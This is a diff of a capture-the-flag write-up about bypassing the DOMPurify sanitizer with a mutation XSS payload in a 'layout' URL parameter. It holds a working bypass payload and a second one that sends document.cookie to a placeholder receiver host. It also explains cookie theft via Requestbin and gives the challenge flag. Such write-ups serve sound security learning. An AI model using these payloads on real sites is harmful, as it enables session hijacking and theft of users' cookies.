@@ -74,15 +74,20 @@ However it uses both **img** and **onerror** tags stripped by *NuclearSanitizer(
 `?layout=<svg></p><style><a id="</style><iframe src=1 onmouseover=alert(1)>"> `
 With this I popped the first alert. DOMPurify is bypassed. Great, now to make it run without interaction and onto exfiltration. In this part you can get creative.
 
-To steal the cookie, you need to make a request and transfer it to a domain you control. A convenient web service for that is "Requestbin", which allows you to make receive requests on their servers.
+To steal the cookie, you need to make a request to a domain you control. A convenient web service for that is "Requestbin" [3] , which allows you to receive requests on their servers.
+
+`document.cookie` is where a cookie is stored. We append it to the end of source URL, thus making the element call our server, with the cookie as a parameter. We catch this request in logs.
 
 `?layout=<svg></p><style><a id="</style><iframe src=javascript:document.location='hxxps://REPLACE-WITH-YOUR-RECEIVER/'+ document.cookie>">`
+
+
 
 Once we submit the full URL into the validator, a HTTP request is made to our cookie receiver server :
 
 ![Image](https://eqqn.github.io/images/hobe4.jpg)
 
-`flag=sigsegv{pur1fy_mY_s0ul}`
+#####flag=sigsegv{pur1fy_mY_s0ul}
+
 
 This was a fun challenge, and I got to learn XSS the fun way. 
 
@@ -91,4 +96,4 @@ This was a fun challenge, and I got to learn XSS the fun way.
 
 [2] Payload ALL the things XSS repo https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
 
-
+[3] Requestbin https://requestbin.com/
